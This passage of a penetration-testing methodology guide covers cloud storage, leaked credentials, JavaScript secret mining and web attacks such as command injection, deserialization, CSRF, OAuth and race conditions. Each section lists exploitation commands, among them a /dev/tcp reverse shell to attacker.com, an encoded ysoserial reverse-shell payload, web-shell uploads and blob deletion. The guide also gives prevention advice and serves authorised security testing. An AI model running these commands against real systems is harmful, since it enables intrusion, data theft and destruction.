- **Firebase Authentication bypass** – Weak authentication rules, token manipulation
- **Firebase Storage misconfigurations** – Publicly readable storage buckets

**Prevention Guidance**:
- Implement strong security rules, validate input, use authentication
- Enable Firebase Security Rules testing, regular security audits
- Monitor for anomalous database access, Cloud Functions triggers
- Educate developers about Firebase security, secure coding practices

**References**: [Firebase Security Rules](https://firebase.google.com/docs/rules), [Firebase‑Security‑Scanner](https://github.com/MuhammadKhizerJaved/Firebase-Security-Scanner)

### 9.3 Azure Blob Storage

**Methodology Overview**:
- **Storage Account Discovery** – Find Azure storage account names, connection strings
- **Container Enumeration** – List containers, check public access levels
- **Blob Access Testing** – Test for publicly readable/writable blobs
- **Sensitive Data Detection** – Scan for sensitive files, credentials, backups

**Tool Installation**:
```bash
# Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# AzCopy (for blob operations)
wget https://aka.ms/downloadazcopy-v10-linux
tar -xvf downloadazcopy-v10-linux
sudo cp ./azcopy_linux_amd64_*/azcopy /usr/local/bin/
```

**Key Detection Commands**:
```bash
# Discover storage accounts
nslookup *.blob.core.windows.net | grep "name"

# List containers (if public)
az storage container list --account-name storageaccount --auth-mode anonymous

# List blobs in container
az storage blob list --account-name storageaccount --container containername --auth-mode anonymous

# Download blob
az storage blob download --account-name storageaccount --container containername --name blobname --file localfile --auth-mode anonymous
```

**Exploitation Commands**:
```bash
# Upload malicious blob
az storage blob upload --account-name storageaccount --container containername --name shell.aspx --file shell.aspx --auth-mode anonymous

# Modify container ACL
az storage container set-permission --account-name storageaccount --container containername --public-access blob --auth-mode anonymous

# Delete blobs (if writable)
az storage blob delete --account-name storageaccount --container containername --name blobname --auth-mode anonymous
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Azure Storage SAS token abuse** – Shared Access Signature token leakage, privilege escalation
- **Azure Storage firewall bypass** – Via Azure services, trusted Microsoft services
- **Azure Blob versioning** – Access previous versions of blobs, sensitive data exposure
- **Azure Storage encryption bypass** – Missing encryption, key mismanagement

**Prevention Guidance**:
- Enable storage account firewalls, use private endpoints, disable public access
- Use SAS tokens with least privilege, short expiry, regular rotation
- Enable encryption, versioning, soft delete, regular security audits
- Monitor for anomalous storage access, CloudTrail events

**References**: [Azure Storage Security](https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide), [AzCopy](https://docs.microsoft.com/en-us/azure/storage/common/storage-use-azcopy-v10)

### 9.4 GCP Storage

**Methodology Overview**:
- **Bucket Discovery** – Find GCS bucket names, project IDs, configuration files
- **Permission Testing** – Test for publicly readable/writable buckets, IAM policies
- **Data Exposure** – Check for sensitive files, credentials, backups
- **Authentication Bypass** – Bypass IAM policies, escalate privileges

**Tool Installation**:
```bash
# Google Cloud SDK
curl https://sdk.cloud.google.com | bash
exec -l $SHELL
gcloud init

# gsutil (already included with Cloud SDK)
```

**Key Detection Commands**:
```bash
# Discover buckets
gsutil ls -p project-id
gsutil ls gs://bucket-name/

# Check bucket permissions
gsutil iam get gs://bucket-name

# List objects
gsutil ls -r gs://bucket-name/

# Download object
gsutil cp gs://bucket-name/object.txt .
```

**Exploitation Commands**:
```bash
# Upload malicious object
gsutil cp shell.php gs://bucket-name/

# Modify bucket IAM policy
gsutil iam set policy.json gs://bucket-name

# Delete objects (if writable)
gsutil rm gs://bucket-name/object.txt
```

**Advanced Techniques (2025‑2026 Trends)**:
- **GCP IAM policy bypass** – Overly permissive roles, missing conditions
- **GCP Storage uniform bucket-level access** – Misconfigured uniform vs fine‑grained ACLs
- **GCP Storage encryption bypass** – Missing KMS encryption, default encryption
- **GCP Storage lifecycle rules** – Data exposure via retention policies

**Prevention Guidance**:
- Enable uniform bucket‑level access, use IAM conditions, least‑privilege roles
- Enable encryption, versioning, retention policies, regular security audits
- Monitor for anomalous storage access, Cloud Audit Logs
- Educate developers about GCP storage security, secure coding practices

**References**: [GCP Storage Security](https://cloud.google.com/storage/docs/security), [gsutil](https://cloud.google.com/storage/docs/gsutil)

### 9.5 Cloud Credential Files

**Methodology Overview**:
- **Credential Discovery** – Find AWS `credentials`, Azure `azureProfile.json`, GCP `application_default_credentials.json`
- **Credential Validation** – Test credentials for validity, permissions, scope
- **Credential Abuse** – Access cloud resources, escalate privileges, exfiltrate data
- **Credential Leakage Prevention** – Detect leaks, rotate credentials, monitor usage

**Tool Installation**:
```bash
# Cloud credential scanners
pip3 install trufflehog
go install github.com/zricethezav/gitleaks/v8/cmd/gitleaks@latest

# Cloud‑specific tools
aws configure list
az account show
gcloud config list
```

**Key Detection Commands**:
```bash
# Search for AWS credentials
grep -r "AKIA[0-9A-Z]{16}" .

# Search for Azure credentials
grep -r "DefaultEndpointsProtocol" .

# Search for GCP credentials
grep -r "type.*service_account" .

# Validate AWS credentials
aws sts get-caller-identity

# Validate Azure credentials
az account show

# Validate GCP credentials
gcloud auth list
```

**Exploitation Commands**:
```bash
# AWS credential abuse
aws s3 ls
aws ec2 describe-instances
aws iam list-users

# Azure credential abuse
az vm list
az storage account list
az keyvault list

# GCP credential abuse
gcloud compute instances list
gcloud storage buckets list
gcloud iam service-accounts list
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Cloud credential leakage via CI/CD** – GitHub Actions, GitLab CI, Jenkins credentials
- **Cloud credential theft via malware, phishing, insider threats**
- **Cloud credential abuse via cross‑account access, role assumption**
- **Cloud credential monitoring** – Detect anomalous usage, geographic anomalies

**Prevention Guidance**:
- Never commit credentials to version control; use secret managers, environment variables
- Rotate credentials regularly, use least‑privilege IAM policies, enable MFA
- Monitor for credential leakage, anomalous usage, CloudTrail/Cloud Audit Logs
- Educate developers about credential security, secure coding practices

**References**: [AWS Security Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html), [Azure Security Best Practices](https://docs.microsoft.com/en-us/azure/security/fundamentals/identity-management-best-practices), [GCP Security Best Practices](https://cloud.google.com/security/best-practices)

---

## 10. JavaScript Analysis & Client‑Side Secrets

> Comprehensive JavaScript analysis methodology for extracting secrets, endpoints, internal IPs, hidden routes, and business logic flaws from client‑side code, incorporating 2025‑2026 trends (source map analysis, obfuscation/deobfuscation, WebSocket endpoints, client‑side secret leakage).

### Methodology Overview

**Sources of JavaScript Files**:
- **Live JS URLs** – extracted from crawling (`*.js` files)
- **Source maps** (`*.js.map`) – contain original source code, variable names, secrets
- **Inline scripts** – embedded in HTML (`<script>` tags)
- **Dynamic JS** – loaded via XHR/fetch or generated at runtime
- **Third‑party libraries** – vulnerable versions, information leakage

**Common Patterns to Hunt**:
1. **Secrets & Credentials** – Cloud keys, API tokens, OAuth secrets, database strings, private keys
2. **Internal Infrastructure** – Internal IPs, hostnames, network paths
3. **Endpoints & Routes** – API endpoints, hidden admin interfaces, debug endpoints
4. **Business Logic Flaws** – Client‑side access control, price manipulation, input validation bypasses
5. **Configuration & Environment** – Feature flags, debug mode toggles, version numbers

**Tool Installation**:
```bash
# LinkFinder (endpoint extraction)
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder
pip3 install -r requirements.txt

# JS‑beautifier (code formatting)
npm install -g js-beautify

# source‑map‑explorer (source map analysis)
npm install -g source-map-explorer

# trufflehog (secret scanning)
pip3 install trufflehog
```

**Key Detection Commands**:
```bash
# Extract live JavaScript files
cat crawledurls.txt | grep "\.js" | grep -Ev "\.json|\.jsp" | sort -u | httpx -silent -mc 200,301,302 -threads 200 -o livejslinks.txt

# LinkFinder for endpoint extraction
cat livejslinks.txt | xargs -I@ python3 ~/tools/LinkFinder/linkfinder.py -i @ -o cli | grep -E "(http|https)://" | anew js-endpoints.txt

# Secret scanning with trufflehog
trufflehog filesystem --directory=./js-files/

# Source map analysis
source-map-explorer bundle.js.map
```

**Exploitation Commands**:
```bash
# Extract API endpoints from JS
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo '"(/api/[^"]+|\/v[0-9]+/[^"]+|/graphql[^"]*)"' | sed 's/"//g' | sort -u > js-api-endpoints.txt

# Extract fetch/axios calls
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo 'fetch\(["'"'"'][^"'"'"']+["'"'"']\)|axios\.(get|post|put|delete)\(["'"'"'][^"'"'"']+["'"'"']\)' | sed -E "s/.*['\"]([^'\"]+)['\"].*/\1/" | sort -u > api-calls.txt

# Extract internal IPs
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo '(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})' | sort -u > internal-ips.txt
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Source map exploitation** – Extract original source code, secrets, debugging symbols
- **JavaScript obfuscation/deobfuscation** – Reverse engineer obfuscated code, find hidden logic
- **WebSocket endpoint discovery** – Extract WebSocket URLs from JS, test for vulnerabilities
- **Client‑side secret leakage** – Hard‑coded keys in frontend code, exposure via source maps
- **JavaScript prototype pollution detection** – Identify vulnerable client‑side code

**Prevention Guidance**:
- Never include secrets in client‑side code; use environment variables, backend APIs
- Minify/obfuscate production code, but avoid relying on obfuscation for security
- Use source maps only in development, exclude from production deployments
- Regularly scan JavaScript files for secrets, internal references, vulnerable libraries
- Implement Content Security Policy (CSP) to restrict script sources

**References**: [OWASP Client‑Side Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing), [PortSwigger Web Security Academy](https://portswigger.net/web-security), [LinkFinder](https://github.com/GerbenJavado/LinkFinder), [JS‑beautifier](https://github.com/beautify-web/js-beautify)

---

## 11. Advanced / Specialized Checks

> Comprehensive testing methodology for advanced and specialized web vulnerabilities (Command Injection, Business Logic, File Upload, Cache Deception, CSRF, Clickjacking, Insecure Deserialization, OAuth, NoSQL Injection, Race Conditions, WebSockets, Directory Enumeration, CSP Bypass, Nuclei Scanning, CVE Checks, Specialized Recon, Nuclei Cheat Sheets) based on OWASP, PortSwigger, and 2025‑2026 trends.

### 11.1 Command Injection

**Methodology Overview**:
- **Basic command injection** – Inject OS commands via user input (`;`, `|`, `&`, `$()`, `` ` ``)
- **Blind command injection** – No output, detect via time delays, out‑of‑band callbacks
- **Advanced command injection** – Bypass filters, sandbox escapes, privilege escalation
- **Command injection chaining** – Combine with XSS, SSRF, RCE

**Tool Installation**:
```bash
# Commix (automated command injection)
git clone https://github.com/commixproject/commix.git
cd commix
pip3 install -r requirements.txt
```

**Key Detection Commands**:
```bash
# Basic injection
curl "https://target.com/page?cmd=;id"
curl "https://target.com/page?cmd=|whoami"

# Time‑based detection
curl "https://target.com/page?cmd=sleep 5"

# Out‑of‑band detection
curl "https://target.com/page?cmd=nslookup attacker.oastify.com"
```

**Exploitation Commands**:
```bash
# Execute arbitrary commands
curl "https://target.com/page?cmd=;cat /etc/passwd"
curl "https://target.com/page?cmd=|ls -la"

# Reverse shell
curl "https://target.com/page?cmd=;bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"

# File write
curl "https://target.com/page?cmd=;echo '<?php system(\$_GET[\"c\"]); ?>' > shell.php"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Command injection via file uploads, PDF generators, email parsers**
- **Command injection bypass via Unicode, base64, hex encoding**
- **Command injection chaining with XSS, SSRF, RCE**
- **Automated detection with Commix, Nuclei templates**

**Prevention Guidance**:
- Validate input, use safe APIs, avoid system/exec calls
- Implement proper sandboxing, least privilege, regular security testing
- Monitor for command injection attempts, anomalous process execution
- Educate developers about command injection risks, secure coding practices

**References**: [OWASP Command Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html), [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection), [Commix](https://github.com/commixproject/commix)

### 11.2 Business Logic Testing

**Methodology Overview**:
- **Business logic flaws** – Abuse application‑specific workflows, bypass restrictions
- **Price manipulation** – Modify prices, discounts, coupons, shopping cart totals
- **Quantity manipulation** – Change quantities, negative values, integer overflows
- **Workflow bypass** – Skip steps, replay actions, race conditions

**Tool Installation**:
```bash
# Burp Suite (manual testing)
# Browser developer tools
```

**Key Detection Commands**:
```bash
# Price manipulation
curl -X POST "https://target.com/checkout" -d "price=-1"
curl -X POST "https://target.com/checkout" -d "price=0.01"

# Quantity manipulation
curl -X POST "https://target.com/cart" -d "quantity=-1"
curl -X POST "https://target.com/cart" -d "quantity=999999"

# Workflow bypass
curl -X POST "https://target.com/confirm" -d "step=final"  # skip previous steps
```

**Exploitation Commands**:
```bash
# Negative price attack
curl -X POST "https://target.com/checkout" -d "price=-100" -H "Cookie: session=valid"

# Coupon reuse
curl -X POST "https://target.com/apply-coupon" -d "code=DISCOUNT50" -H "Cookie: session=valid"

# Race condition (parallel requests)
for i in {1..10}; do curl -X POST "https://target.com/transfer" -d "amount=100&to=attacker" & done
```

**Advanced Techniques (2025‑2026 Trends)**:
- **AI‑powered business logic testing** – ML‑based anomaly detection, pattern recognition
- **Business logic chaining** – Combine with XSS, CSRF, authentication bypass
- **Business logic via API** – Abuse REST/GraphQL endpoints, batch operations
- **Automated detection with custom scripts, fuzzing**

**Prevention Guidance**:
- Implement server‑side validation, business logic checks, audit logs
- Use idempotent operations, prevent race conditions, regular security testing
- Monitor for business logic anomalies, suspicious transactions
- Educate developers about business logic risks, secure coding practices

**References**: [OWASP Business Logic Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Business_Logic/), [PortSwigger Business Logic](https://portswigger.net/web-security/logic-flaws)

### 11.3 File Upload Vulnerabilities

**Methodology Overview**:
- **Basic file upload** – Upload malicious files (PHP, ASP, JSP, SVG)
- **Advanced file upload** – Bypass filters, file type confusion, polyglot files
- **File upload chaining** – Combine with XSS, RCE, SSRF, LFI

**Tool Installation**:
```bash
# Burp Suite (manual testing)
# Upload‑scanner (automated)
git clone https://github.com/Raz0r/upload-scanner.git
```

**Key Detection Commands**:
```bash
# Test allowed extensions
curl -X POST "https://target.com/upload" -F "file=@shell.php"
curl -X POST "https://target.com/upload" -F "file=@shell.php.jpg"

# Test content‑type bypass
curl -X POST "https://target.com/upload" -H "Content-Type: image/jpeg" -F "file=@shell.php"

# Test null bytes
curl -X POST "https://target.com/upload" -F "file=@shell.php%00.jpg"
```

**Exploitation Commands**:
```bash
# Upload web shell
curl -X POST "https://target.com/upload" -F "file=@shell.php"

# Upload SVG with XSS
curl -X POST "https://target.com/upload" -F "file=@xss.svg"

# Upload polyglot file
curl -X POST "https://target.com/upload" -F "file=@polyglot.jpg.php"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **File upload via API** – REST/GraphQL endpoints, multipart/form‑data
- **File upload bypass via Unicode, magic bytes, file signature spoofing**
- **File upload chaining with XSS, RCE, SSRF, LFI**
- **Automated detection with Nuclei templates, custom scripts**

**Prevention Guidance**:
- Validate file types, extensions, content, size; store files outside web root
- Use secure file APIs, scan for malware, regular security testing
- Monitor for file upload attempts, anomalous file types
- Educate developers about file upload risks, secure coding practices

**References**: [OWASP File Upload Security](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload), [PortSwigger File Upload](https://portswigger.net/web-security/file-upload)

### 11.4 Web Cache Deception

**Methodology Overview**:
- **Basic cache deception** – Trick cache into storing sensitive user‑specific content
- **Advanced cache deception** – Bypass cache keys, exploit cache‑specific behaviors
- **Cache deception chaining** – Combine with XSS, SSRF, open redirect

**Tool Installation**:
```bash
# Burp Suite (manual testing)
# Browser developer tools
```

**Key Detection Commands**:
```bash
# Test cacheable paths
curl -I "https://target.com/profile"
curl -I "https://target.com/profile.json"

# Test cache key bypass
curl -I "https://target.com/profile?cachebuster=123"
curl -I "https://target.com/profile#fragment"
```

**Exploitation Commands**:
```bash
# Deceive cache into storing sensitive data
curl "https://target.com/profile.json" -H "Cookie: session=victim"
# Then request same URL without cookie – if cached, get victim data

# Poison cache with malicious content
curl "https://target.com/page?param=value" -H "X‑Forwarded‑Host: evil.com"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Cache deception via Unicode, IDN homoglyphs, domain confusion**
- **Cache deception chaining with XSS, SSRF, open redirect**
- **Automated detection with Nuclei templates, custom scripts**
- **Cache deception in CDNs (CloudFront, Akamai, Fastly)**

**Prevention Guidance**:
- Validate cache keys, avoid caching user‑specific content, use secure cache headers
- Implement cache‑control headers, regular security testing, monitoring for cache deception attempts
- Educate developers about cache deception risks, secure coding practices

**References**: [PortSwigger Web Cache Deception](https://portswigger.net/web-security/web-cache-deception), [OWASP Cache Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_HTTP_Cache_Control)

### 11.5 CSRF (Cross‑Site Request Forgery)

**Methodology Overview**:
- **Basic CSRF** – Forge requests from victim's browser, exploit lack of anti‑CSRF tokens
- **Advanced CSRF** – Bypass token validation, same‑site cookies, referer checks
- **CSRF chaining** – Combine with XSS, SSRF, authentication bypass

**Tool Installation**:
```bash
# Burp Suite (manual testing)
# CSRF‑PoC generator (browser extension)
```

**Key Detection Commands**:
```bash
# Check for anti‑CSRF tokens
curl -s "https://target.com/form" | grep -E "csrf|token"

# Test referer validation
curl -X POST "https://target.com/action" -H "Referer: https://evil.com"

# Test same‑site cookies
curl -X POST "https://target.com/action" -H "Cookie: session=valid" --cookie‑jar cookies.txt
```

**Exploitation Commands**:
```bash
# Generate CSRF PoC
<html>
<body>
<form action="https://target.com/change-email" method="POST">
<input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>

# Bypass token validation (if predictable)
curl -X POST "https://target.com/action" -d "email=attacker@evil.com&csrf=123456"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **CSRF via JSON, XML, GraphQL** – Content‑type manipulation, JSON‑based CSRF
- **CSRF bypass via same‑site cookie lax/strict, referer spoofing**
- **CSRF chaining with XSS, SSRF, authentication bypass**
- **Automated detection with Nuclei templates, custom scripts**

**Prevention Guidance**:
- Implement anti‑CSRF tokens, same‑site cookies, referer validation
- Use secure headers, regular security testing, monitoring for CSRF attempts
- Educate developers about CSRF risks, secure coding practices

**References**: [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html), [PortSwigger CSRF](https://portswigger.net/web-security/csrf)

### 11.6 Clickjacking

**Methodology Overview**:
- **Basic clickjacking** – Overlay invisible iframe, trick user into clicking hidden elements
- **Advanced clickjacking** – Bypass frame‑busting scripts, X‑Frame‑Options, CSP
- **Clickjacking chaining** – Combine with XSS, CSRF, authentication bypass

**Tool Installation**:
```bash
# Burp Suite (manual testing)
# Browser developer tools
```

**Key Detection Commands**:
```bash
# Check X‑Frame‑Options
curl -I "https://target.com/page" | grep -i "x-frame-options"

# Check CSP frame‑ancestors
curl -I "https://target.com/page" | grep -i "content-security-policy"

# Test frame‑busting scripts
curl -s "https://target.com/page" | grep -i "frame-buster|top.location"
```

**Exploitation Commands**:
```bash
# Basic clickjacking PoC
<html>
<head>
<style>iframe { position:absolute; opacity:0; top:0; left:0; width:100%; height:100%; }</style>
</head>
<body>
<iframe src="https://target.com/delete-account"></iframe>
</body>
</html>

# Bypass frame‑busting scripts
# Use sandbox attribute, referer policy, etc.
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Clickjacking via multiple iframes, opacity manipulation, cursor spoofing**
- **Clickjacking bypass via X‑Frame‑Options ALLOW‑FROM, CSP frame‑ancestors**
- **Clickjacking chaining with XSS, CSRF, authentication bypass**
- **Automated detection with Nuclei templates, custom scripts**

**Prevention Guidance**:
- Implement X‑Frame‑Options DENY/SAMEORIGIN, CSP frame‑ancestors, frame‑busting scripts
- Use secure headers, regular security testing, monitoring for clickjacking attempts
- Educate developers about clickjacking risks, secure coding practices

**References**: [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [PortSwigger Clickjacking](https://portswigger.net/web-security/clickjacking)

### 11.7 Insecure Deserialization

**Methodology Overview**:
- **Basic deserialization** – Inject malicious serialized objects, trigger gadget chains
- **Advanced deserialization** – Bypass filters, exploit custom gadget chains, blind RCE
- **Deserialization chaining** – Combine with SSRF, XXE, file write

**Tool Installation**:
```bash
# Java – ysoserial
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn clean package -DskipTests

# PHP – phpggc
git clone https://github.com/ambionics/phpggc.git
cd phpggc && chmod +x phpggc

# .NET – ysoserial.net
git clone https://github.com/pyn3rd/ysoserial.net.git
cd ysoserial.net && dotnet build
```

**Key Detection Commands**:
```bash
# Detect serialized data
curl -s "http://target.com" | grep -oE '(O:[0-9]+:"[^"]+"|[a-zA-Z0-9+/=]{50,})'

# Test PHP object injection
curl -v "http://target.com/" -H "Cookie: user=O:8:\"stdClass\":1:{s:4:\"role\";s:5:\"admin\";}"

# Test Java deserialization
curl -X POST "http://target.com/api/process" -d "serialized=$(java -jar ysoserial.jar URLDNS 'http://attacker.oastify.com' | base64 -w0)"
```

**Exploitation Commands**:
```bash
# PHP gadget chain
./phpggc Monolog/RCE1 system 'id' | base64 -w0

# Java gadget chain
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0

# .NET gadget chain
./ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c "calc.exe" -o base64
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Blind deserialization** – OOB DNS/HTTP callbacks, time‑based detection
- **Gadget rediscovery** – Static analysis of dependencies, custom chains
- **Polyglot payloads** – Cross‑language deserialization attacks
- **Automated detection with gadgetinspector, Nuclei templates**

**Prevention Guidance**:
- Avoid deserializing untrusted data; use safe formats, allow‑lists
- Implement proper validation, integrity checks, sandboxing
- Monitor for deserialization attempts, anomalous object creation
- Educate developers about deserialization risks, secure coding practices

**References**: [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html), [PortSwigger Insecure Deserialization](https://portswigger.net/web-security/deserialization), [ysoserial](https://github.com/frohoff/ysoserial)

### 11.8 OAuth Authentication

**Methodology Overview**:
- **OAuth misconfigurations** – Missing/weak state parameter, redirect_uri validation, PKCE
- **OAuth attacks** – CSRF, token leakage, scope escalation, code/token replay
- **OAuth chaining** – Combine with XSS, SSRF, open redirect

**Tool Installation**:
```bash
# Burp Suite (manual testing)
# OAuth‑Attack‑Suite (Burp extension)
```

**Key Detection Commands**:
```bash
# Check state parameter
curl -I "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=CALLBACK&state=123"

# Test redirect_uri validation
curl -I "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://evil.com"

# Test PKCE bypass
curl -I "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=CALLBACK&code_challenge=INVALID&code_challenge_method=S256"
```

**Exploitation Commands**:
```bash
# CSRF attack (missing state)
https://target.com/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://attacker.com

# Token leakage via referer
curl -I "https://target.com/oauth/callback?code=LEAKED_CODE" -H "Referer: https://evil.com"

# Scope escalation
curl -I "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=CALLBACK&scope=admin"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **OAuth 2.1/2.2** – PKCE mandatory, state/nonce enforcement, redirect_uri strict matching
- **OAuth bypass via open redirect, code injection, token swapping**
- **OAuth chaining with XSS, SSRF, open redirect**
- **Automated detection with OAuth‑Attack‑Suite, Nuclei templates**

**Prevention Guidance**:
- Implement state parameter, PKCE, redirect_uri validation, scope validation
- Use secure headers, regular security testing, monitoring for OAuth attacks
- Educate developers about OAuth risks, secure coding practices

**References**: [OWASP OAuth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth_2.0_Cheat_Sheet.html), [PortSwigger OAuth](https://portswigger.net/web-security/oauth)

### 11.9 NoSQL Injection

**Methodology Overview**:
- **Basic NoSQL injection** – Inject NoSQL operators (`$ne`, `$gt`, `$where`, `$regex`)
- **Advanced NoSQL injection** – Bypass filters, blind injection, RCE
- **NoSQL injection chaining** – Combine with XSS, SSRF, authentication bypass

**Tool Installation**:
```bash
# NoSQL‑map (automated NoSQL injection)
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
pip3 install -r requirements.txt
```

**Key Detection Commands**:
```bash
# Test MongoDB injection
curl -X POST "https://target.com/login" -d '{"username":"admin","password":{"$ne":""}}'

# Test CouchDB injection
curl -X GET "https://target.com/users?key=value&$where=1==1"

# Test Redis injection
curl -X POST "https://target.com/query" -d '{"cmd":"FLUSHALL"}'
```

**Exploitation Commands**:
```bash
# Bypass authentication
curl -X POST "https://target.com/login" -d '{"username":"admin","password":{"$ne":""}}'

# Extract data
curl -X POST "https://target.com/users" -d '{"$where":"this.password.length > 0"}'

# RCE (if eval enabled)
curl -X POST "https://target.com/query" -d '{"$eval":"function(){return process.version}"}'
```

**Advanced Techniques (2025‑2026 Trends)**:
- **NoSQL injection via GraphQL, REST APIs, ORM layers**
- **NoSQL injection bypass via Unicode, base64, hex encoding**
- **NoSQL injection chaining with XSS, SSRF, RCE**
- **Automated detection with NoSQL‑map, Nuclei templates**

**Prevention Guidance**:
- Validate input, use parameterized queries, least privilege database accounts
- Implement proper authentication, authorization, regular security testing
- Monitor for NoSQL injection attempts, anomalous database queries
- Educate developers about NoSQL injection risks, secure coding practices

**References**: [OWASP NoSQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Injection_Prevention_Cheat_Sheet.html), [PortSwigger NoSQL Injection](https://portswigger.net/web-security/nosql-injection), [NoSQLMap](https://github.com/codingo/NoSQLMap)

### 11.10 Race Conditions

**Methodology Overview**:
- **Basic race condition** – Concurrent requests exploit time‑of‑check‑to‑time‑of‑use (TOCTTOU)
- **Advanced race condition** – Bypass locks, atomicity violations, double spends
- **Race condition chaining** – Combine with XSS, CSRF, authentication bypass

**Tool Installation**:
```bash
# Burp Suite (Turbo Intruder)
# Race‑pwn (custom scripts)
```

**Key Detection Commands**:
```bash
# Test for race conditions
for i in {1..10}; do curl -X POST "https://target.com/transfer" -d "amount=100&to=attacker" & done

# Test for TOCTTOU
curl -X POST "https://target.com/withdraw" -d "amount=100" &
curl -X POST "https://target.com/withdraw" -d "amount=100" &
```

**Exploitation Commands**:
```bash
# Double spend attack
for i in {1..10}; do curl -X POST "https://target.com/purchase" -d "item=premium&price=0" & done

# Bypass rate limits
for i in {1..100}; do curl -X POST "https://target.com/verify" -d "code=123456" & done

# Account takeover
curl -X POST "https://target.com/change-email" -d "email=attacker@evil.com" &
curl -X POST "https://target.com/confirm-email" -d "token=OLD_TOKEN" &
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Race conditions via WebSockets, GraphQL subscriptions, serverless functions**
- **Race condition bypass via locking, atomic operations, idempotency tokens**
- **Race condition chaining with XSS, CSRF, authentication bypass**
- **Automated detection with Turbo Intruder, custom scripts**

**Prevention Guidance**:
- Implement locking, atomic operations, idempotency tokens, optimistic/pessimistic concurrency control
- Use database transactions, rate limiting, regular security testing
- Monitor for race condition attempts, anomalous concurrent requests
- Educate developers about race condition risks, secure coding practices

**References**: [OWASP Race Conditions](https://owasp.org/www-community/attacks/Race_Conditions), [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)

### 11.11 WebSockets

**Methodology Overview**:
- **WebSocket discovery** – Find WebSocket endpoints (`ws://`, `wss://`)
- **WebSocket testing** – Message injection, CSRF, authentication bypass
- **WebSocket chaining** – Combine with XSS, SSRF, RCE

**Tool Installation**:
```bash
# Burp Suite (WebSocket tab)
# ws‑tool (command‑line)
pip3 install websocket-client
```

**Key Detection Commands**:
```bash
# Find WebSocket endpoints
cat crawledurls.txt | grep -iE "(socket|ws://|wss://)" | anew websocket.txt

# Test WebSocket connectivity
python3 -c "import websocket; ws = websocket.create_connection('wss://target.com/ws'); print(ws.recv())"
```

**Exploitation Commands**:
```bash
# Message injection
python3 -c "import websocket; ws = websocket.create_connection('wss://target.com/ws'); ws.send('{\"message\":\"<script>alert(1)</script>\"}'); print(ws.recv())"

# CSRF via WebSocket
# If authentication tied to cookies, WebSocket requests may be automatically authenticated

# Authentication bypass
python3 -c "import websocket; ws = websocket.create_connection('wss://target.com/ws', header={'Authorization': 'Bearer invalid'}); print(ws.recv())"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **WebSocket via API gateways, serverless functions, cloud‑native services**
- **WebSocket bypass via subprotocol negotiation, cross‑origin WebSocket hijacking**
- **WebSocket chaining with XSS, SSRF, RCE**
- **Automated detection with Nuclei templates, custom scripts**

**Prevention Guidance**:
- Validate WebSocket messages, implement authentication, authorization, rate limiting
- Use secure headers, regular security testing, monitoring for WebSocket attacks
- Educate developers about WebSocket risks, secure coding practices

**References**: [OWASP WebSocket Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing/10-Testing_WebSockets), [PortSwigger WebSockets](https://portswigger.net/web-security/websockets)

### 11.12 Directory & File Enumeration

**Methodology Overview**:
- **Directory brute‑forcing** – Discover hidden directories, files, backups
- **File enumeration** – Find sensitive files, configuration files, backups
- **Advanced enumeration** – Bypass filters, rate limits, WAFs

**Tool Installation**:
```bash
# ffuf
go install github.com/ffuf/ffuf@latest

# feroxbuster
go install github.com/epi052/feroxbuster@latest

# dirsearch
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
